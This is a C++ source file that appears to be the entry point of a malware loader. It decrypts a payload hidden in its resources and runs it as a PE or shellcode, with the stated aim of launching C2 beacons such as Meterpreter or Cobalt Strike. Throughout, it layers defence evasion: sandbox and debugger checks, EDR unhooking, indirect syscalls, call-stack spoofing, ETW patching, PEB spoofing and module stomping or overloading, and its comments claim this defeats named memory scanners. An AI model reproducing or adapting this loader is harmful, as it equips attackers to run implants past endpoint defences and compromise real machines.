#include <Windows.h>
#include "Common.h"
#include "ApiHashing.h"
#include "Payload.h"
#include "Opsec.h"
#include "..\Engine\NtApi.h"
#include "..\Engine\RunPE.h"
#include "..\Engine\OpsecFlags.h"
#include "Syscalls.h"
#include "StackSpoof.h"
#include "ModuleStomping.h"
#include "Evasion.h"
#include "..\Engine\Xtea.h"
#include "Unhooker.h"

// Force C++ compiler to treat this as C linkable
extern "C" {
    BOOL InitNtApi(void);
}

typedef LPVOID   (WINAPI *pfnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL     (WINAPI *pfnVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef VOID     (WINAPI *pfnExitProcess)(UINT);
typedef VOID     (WINAPI *pfnExitThread_t)(DWORD);
typedef NTSTATUS (WINAPI *pfnNtProtect_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

#define RESOLVE_API(TYPE, HMOD, HASH) ((TYPE)GetProcAddressH(HMOD, HASH))

/* ============================================================
 *  EntryPoint – modular entry point independent of CRT
 * ============================================================ */
extern "C" int EntryPoint() {

    /* MUST be first — populates all g_Hash_* before any lookup */
    ApiHashing_InitHashes();

    HMODULE hKernel32 = GetModuleHandleH(g_Hash_kernel32);
    if (!hKernel32) return 1;

    pfnExitProcess  pExitProcess  = RESOLVE_API(pfnExitProcess,  hKernel32, g_Hash_ExitProcess);
    pfnVirtualAlloc pVirtualAlloc = RESOLVE_API(pfnVirtualAlloc, hKernel32, g_Hash_VirtualAlloc);
    pfnVirtualFree  pVirtualFree  = RESOLVE_API(pfnVirtualFree,  hKernel32, g_Hash_VirtualFree);

    if (!pExitProcess)  return 22;
    if (!pVirtualAlloc) return 23;
    if (!pVirtualFree)  return 24;

    /* Step 1: Read .rsrc metadata — opsecFlags must be known before evasion
     * checks so that per-check EVASION_FLAG_NO_* bits can be honoured.
     * Resource parsing is fast (no crypto — just locating the 280-byte
     * metadata block in the already-mapped .rsrc section). */
    PBYTE  pEncryptedPayload = NULL;
    DWORD  payloadSize = 0, mutatedStubSize = 0, origDecompSize = 0;
    DWORD  key_salt[4]    = { 0 };
    BYTE   dll_indices[3] = { 0 };
    DWORD  exportHash     = 0;
    LPCSTR pExportArg     = NULL;   /* points into locked resource view — valid for process lifetime */
    LPCSTR pSpoofExe      = NULL;   /* points into locked resource view — valid for process lifetime */
    LPCSTR pSemaphoreName = NULL;   /* points into locked resource view — NULL = use default "wuauctl" */
    DWORD  sleepFwdMs     = 0;      /* 0 = use default 500 ms in Evasion_CheckSleepForwarding */
    DWORD  uptimeMin      = 0;      /* 0 = use default 2 min in Evasion_CheckUptime */
    DWORD  hammerMs       = 0;      /* 0 = use default 3000 ms in Evasion_HammerDelay */
    DWORD  opsecFlags     = 0;
    DWORD  dwExtractionError = 0;

    if (!GetPayloadFromResource(&pEncryptedPayload, &payloadSize, &mutatedStubSize, &origDecompSize,
                                key_salt, dll_indices, &exportHash, &pExportArg, &pSpoofExe,
                                &pSemaphoreName, &sleepFwdMs, &uptimeMin, &hammerMs,
                                &opsecFlags, &dwExtractionError)) {
        pExitProcess(dwExtractionError);
    }

    /* Step 1.5: Evasion — timing delay + sandbox/debugger detection.
     *
     * Placed AFTER resource read so opsecFlags (including EVASION_FLAG_NO_*)
     * are available.
     *
     * HammerDelay first: burns real wall-clock time before any visible OPSEC
     * activity.  RunChecks then tests for debuggers and sandbox indicators.
     * Exit code 0 ("normal termination") avoids the suspicious exit codes
     * used for genuine errors elsewhere in the loader. */
    Evasion_HammerDelay(hammerMs ? hammerMs : 3000, opsecFlags);
    if (Evasion_RunChecks(opsecFlags, pSemaphoreName, sleepFwdMs, uptimeMin)) pExitProcess(0);

    /* Step 2: Syscalls + NT API init — always required */
    if (!Syscalls_Init())  pExitProcess(29);
    if (!InitNtApi())      pExitProcess(30);

    /* Step 2.5: Optional EDR userland unhooker.
    * Restores original .text bytes in ntdll/kernel32/kernelbase from
    * \KnownDlls\ clean copies, overwriting EDR inline hooks.
    * Runs after InitNtApi so Sys_Nt* wrappers (HellsHall) are available.
    * Runs before StackSpoof so subsequent Win32 calls hit clean code. */
    if (opsecFlags & EVASION_FLAG_UNHOOK) {
        Unhook_RestoreAll();
    }

    /* Step 3: Optional call-stack spoofing (SilentMoonwalk RSP pivot).
     * StackSpoof_Init locates two ntdll gadgets (`add rsp, imm; ret` and
     * `jmp rbx`) and builds a synthetic stack so that — every time
     * HellsHallSyscall fires — RSP is pivoted onto a fake frame anchored at
     * RtlUserThreadStart, hiding the loader's real return chain from EDR
     * stack walkers.  Skip when OPSEC_FLAG_NO_CALLSTACK is set. */
    if (!(opsecFlags & OPSEC_FLAG_NO_CALLSTACK)) {
        if (!StackSpoof_Init()) {
            /* 41 = ntdll base, 42 = AddRsp gadget, 43 = JmpRbx gadget,
             * 44 = RtlUserThreadStart export */
            pExitProcess(40 + g_SpoofInitFailStep);
        }
    }

    /* Step 4: Optional ETW patch.
     * Completes the evasion triad:
     *   API hooks     → HellsHall (indirect syscall, no ntdll hook hit)
     *   Call stack    → Moonwalk RSP pivot (synthetic stack rooted at RtlUserThreadStart)
     *   ETW events    → Opsec_PatchEtw (EtwEventWrite → xor eax,eax / ret) */
    if (!(opsecFlags & OPSEC_FLAG_NO_ETW)) {
        if (!Opsec_PatchEtw()) {
            /* 61 = no ntdll, 62 = no EtwEventWrite export,
             * 63 = Syscalls_GetParamsByHash failed for NtProtectVirtualMemory,
             * 64 = NtProtectVirtualMemory returned non-success */
            pExitProcess(60 + g_EtwFailStep);
        }
    }

    /* Step 5: XTEA outer decryption.
     *
     * pEncryptedPayload holds the raw blob from .rsrc:
     *   XTEA_encrypted( [mutated ASM stub | CompoundEncrypted compressed payload] )
     *
     * After Xtea_Crypt() the buffer contains the cleartext ready for module stomping. */
    DWORD xteaKey[4];
    Xtea_DeriveKey(xteaKey, key_salt);
    Xtea_Crypt(pEncryptedPayload, payloadSize, xteaKey);

    /* Wipe key material from stack immediately — no residue.
     * exportSeed is extracted first: RunPE needs it to hash export names. */
    DWORD exportSeed = key_salt[0];
    xteaKey[0]  = xteaKey[1]  = xteaKey[2]  = xteaKey[3]  = 0;
    key_salt[0] = key_salt[1] = key_salt[2] = key_salt[3] = 0;

    /* Step 6: Optional PEB spoof.
     * Placed after payload read to avoid breaking GetModuleFileNameW used
     * internally by some Win32 APIs during resource loading. */
    if (!(opsecFlags & OPSEC_FLAG_NO_PEB)) {
        /* Build full spoof path: "C:\Windows\System32\" + pSpoofExe (ASCII filename).
         * Prefix is XOR-encoded (key 0x66) — no plaintext wide-string IOC in .rdata.
         * Decoded chars: C : \ W i n d o w s \ S y s t e m 3 2 \ */
        static const BYTE kPrefixEnc[] = {
            0x25,0x5C,0x3A,0x31,0x0F,0x08,0x02,0x09,
            0x11,0x15,0x3A,0x35,0x1F,0x15,0x12,0x03,
            0x0B,0x55,0x54,0x3A
        };
        WCHAR spoofPathW[80];
        int   wpi = 0;
        for (int ii = 0; ii < 20; ii++) spoofPathW[wpi++] = (WCHAR)(kPrefixEnc[ii] ^ 0x66u);
        if (pSpoofExe) {
            const char* pNameA = pSpoofExe;
            while (*pNameA && wpi < 79) { spoofPathW[wpi++] = (WCHAR)(unsigned char)*pNameA++; }
        }
        spoofPathW[wpi] = L'\0';
        Opsec_SpoofPeb(spoofPathW);
    }

    /* Step 7: Allocate execution buffer in a legitimate DLL's .text section.
     *
     * Two strategies selected by OPSEC_FLAG_MODULE_OVERLOAD:
     *
     *  Stomping  (default) — LoadLibraryW, section RX → RW, write, restore after use.
     *                        DLL appears in PEB LDR; .text region is disk-backed (MEM_IMAGE).
     *
     *  Overloading         — NtCreateSection(SEC_IMAGE) + NtMapViewOfSection on the raw
     *                        file handle.  DLL is NOT in PEB LDR; region is disk-backed
     *                        (MEM_IMAGE); VirtualQuery shows the backing file path.
     *                        Defeats Moneta/pe-sieve/BeaconEye without a PEB LDR entry.
     *                        After use: NtUnmapViewOfSection discards COW private pages.
     */
    PVOID  pOriginalDllBytes    = NULL;
    SIZE_T originalDllBytesSize = 0;
    PVOID  pOverloadViewBase    = NULL;   /* non-NULL only in MODULE_OVERLOAD mode */

    PVOID execBuf;
    if (opsecFlags & OPSEC_FLAG_MODULE_OVERLOAD) {
        execBuf = ModuleOverload_Alloc(payloadSize, dll_indices,
                                       &pOriginalDllBytes, &originalDllBytesSize,
                                       &pOverloadViewBase);
    } else {
        execBuf = ModuleStomp_Alloc(payloadSize, dll_indices,
                                    &pOriginalDllBytes, &originalDllBytesSize);
    }

    /* dll_indices no longer needed after ModuleStomp_Alloc — zero immediately */
    custom_memset(dll_indices, 0, sizeof(dll_indices));

    if (!execBuf) {
        pVirtualFree(pEncryptedPayload, 0, MEM_RELEASE);
        pExitProcess(33);
    }

    // Copy ONLY the decryptor stub into execBuf (stomped .text section).
    // The payload stays in pEncryptedPayload — a separate RW allocation.
    // Splitting code and data into separate allocations eliminates RWX:
    //   execBuf           — RW during copy → RX for decryptor execution → restored
    //   pEncryptedPayload — RW throughout; decryptor receives its address via RCX
    custom_memcpy(execBuf, pEncryptedPayload, mutatedStubSize);

    DWORD  dwProtectSsn       = 0;
    PVOID  pProtectTrampoline = NULL;
    if (!Syscalls_GetParamsByHash(g_Hash_ZwProtectVirtualMemory, &dwProtectSsn, &pProtectTrampoline)) {
        custom_memset(execBuf, 0, payloadSize);
        custom_memset(pEncryptedPayload, 0, payloadSize);
        pVirtualFree(pEncryptedPayload, 0, MEM_RELEASE);
        pExitProcess(34);
    }

    SetSyscallParams(dwProtectSsn, pProtectTrampoline);
    pfnNtProtect_t pNtProtect = (pfnNtProtect_t)HellsHallSyscall;

    ULONG  dwOldProtect = 0;
    SIZE_T regionSize   = (SIZE_T)mutatedStubSize;

    // Flip RW → RX: no write bit — decryptor is code, payload is in separate buffer
    SetSyscallParams(dwProtectSsn, pProtectTrampoline);
    NTSTATUS status = pNtProtect((HANDLE)-1, &execBuf, &regionSize, PAGE_EXECUTE_READ, &dwOldProtect);
    if (!NT_SUCCESS(status)) {
        custom_memset(execBuf, 0, payloadSize);
        custom_memset(pEncryptedPayload, 0, payloadSize);
        pVirtualFree(pEncryptedPayload, 0, MEM_RELEASE);
        pExitProcess(34);
    }

    // Call decryptor: pass payload pointer in RCX (Windows x64 first argument).
    // Decryptor reads from pEncryptedPayload+mutatedStubSize and decrypts in-place (RW).
    PBYTE pCompressedPayload = pEncryptedPayload + mutatedStubSize;
    typedef void (*DecryptFn_t)(PBYTE pPayload);
    ((DecryptFn_t)execBuf)(pCompressedPayload);

    // Flip RX → RW immediately after decryptor returns — closes the RX window
    // From this point execBuf is writable for wipe + DLL restore
    regionSize = payloadSize;
    SetSyscallParams(dwProtectSsn, pProtectTrampoline);
    pNtProtect((HANDLE)-1, &execBuf, &regionSize, PAGE_READWRITE, &dwOldProtect);

    /* Step 8: Decompression using LZNT1.
     * pCompressedPayload points into pEncryptedPayload (the separate RW buffer).
     * After decompression we zero and free pEncryptedPayload — it's no longer needed */
    DWORD compressedSize = payloadSize - mutatedStubSize;

    BYTE* pDecompressedPE = NULL;
    if (!DecompressPayload(pCompressedPayload, compressedSize, &pDecompressedPE, origDecompSize)) {
        custom_memset(execBuf, 0, payloadSize);
        custom_memset(pEncryptedPayload, 0, payloadSize);
        pVirtualFree(pEncryptedPayload, 0, MEM_RELEASE);
        pExitProcess(34);
    }

    custom_memset(pEncryptedPayload, 0, payloadSize);
    pVirtualFree(pEncryptedPayload, 0, MEM_RELEASE);
    pEncryptedPayload = NULL;

    /* Wipe the decryptor from the stomped region (execBuf is now RW). */
    custom_memset(execBuf, 0, payloadSize);

    if (pOriginalDllBytes && originalDllBytesSize) {
        custom_memcpy(execBuf, pOriginalDllBytes, originalDllBytesSize);

        /* Restore .text: RW → RX (drop write bit, re-add execute) */
        SIZE_T restoreSize  = originalDllBytesSize;
        PVOID  pRestoreBase = execBuf;
        SetSyscallParams(dwProtectSsn, pProtectTrampoline);
        pNtProtect((HANDLE)-1, &pRestoreBase, &restoreSize, PAGE_EXECUTE_READ, &dwOldProtect);

        pVirtualFree(pOriginalDllBytes, 0, MEM_RELEASE);
        pOriginalDllBytes = NULL;
    }

    /* Module Overloading: unmap the disk-backed view to discard COW private pages.
     * For Module Stomping, execBuf lives inside a LoadLibraryW-mapped DLL — no unmap. */
    if (pOverloadViewBase) {
        pNtUnmapViewOfSection((HANDLE)-1, pOverloadViewBase);
        pOverloadViewBase = NULL;
    }

    /* Step 9: Run payload — two paths depending on flags.
     *
     * PE path (default):
     *   Pass StackSpoof_Cleanup as pre-execute callback.  RunPE calls it after
     *   all syscalls complete but before handing over to the payload, so the
     *   pivot is disabled before the payload starts running its own threads
     *   (which must see real return addresses).
     *
     * Shellcode path (PAYLOAD_FLAG_IS_SHELLCODE):
     *   No PE mapping needed.  Flip the decompressed buffer RW→RX via indirect
     *   syscall, call StackSpoof_Cleanup manually (same OPSEC invariant as PE
     *   path), then jump directly into the shellcode.  The RX flip reuses the
     *   same NtProtect SSN + trampoline already resolved above. */
    if (opsecFlags & PAYLOAD_FLAG_IS_SHELLCODE) {
        /* Flip decompressed buffer: RW → RX */
        SIZE_T scSize  = (SIZE_T)origDecompSize;
        PVOID  pScBase = pDecompressedPE;
        SetSyscallParams(dwProtectSsn, pProtectTrampoline);
        status = pNtProtect((HANDLE)-1, &pScBase, &scSize, PAGE_EXECUTE_READ, &dwOldProtect);
        if (!NT_SUCCESS(status)) {
            custom_memset(pDecompressedPE, 0, origDecompSize);
            pVirtualFree(pDecompressedPE, 0, MEM_RELEASE);
            pExitProcess(36);
        }

        /* Disable RSP pivot before handing over — same invariant as RunPE's PreExecuteCb */
        if (!(opsecFlags & OPSEC_FLAG_NO_CALLSTACK)) StackSpoof_Cleanup();

        void (*pShellcode)(void) = (void (*)(void))pDecompressedPE;
        pShellcode();

        /* Reached only if shellcode returns (unusual for C2 beacons) */
        custom_memset(pDecompressedPE, 0, origDecompSize);
        pVirtualFree(pDecompressedPE, 0, MEM_RELEASE);
    } else {
        void (*pPreExec)(void) = (opsecFlags & OPSEC_FLAG_NO_CALLSTACK) ? NULL : StackSpoof_Cleanup;
        DWORD runPeRes = RunPE(pDecompressedPE, exportHash, exportSeed, pExportArg, pPreExec);

        custom_memset(pDecompressedPE, 0, origDecompSize);
        pVirtualFree(pDecompressedPE, 0, MEM_RELEASE);

        if (runPeRes != 0) pExitProcess(runPeRes);
    }

    /* OPSEC_FLAG_KEEP_ALIVE: exit only the loader thread, leave beacon threads running.
     * ExitProcess(777) would kill every thread — including the C2 implant's threads.
     * ExitThread(0) terminates this thread only; the process stays alive as long as
     * any other thread is running.  Required for DLL payloads (Meterpreter, CS beacon)
     * that spawn their own threads from DllMain or the invoked export. */
    if (opsecFlags & OPSEC_FLAG_KEEP_ALIVE) {
        pfnExitThread_t pExitThread = (pfnExitThread_t)GetProcAddressH(hKernel32, g_Hash_ExitThread);
        if (pExitThread) pExitThread(0);
        /* Fallthrough to ExitProcess if ExitThread resolution failed */
    }
    pExitProcess(777);
    return 777;
}
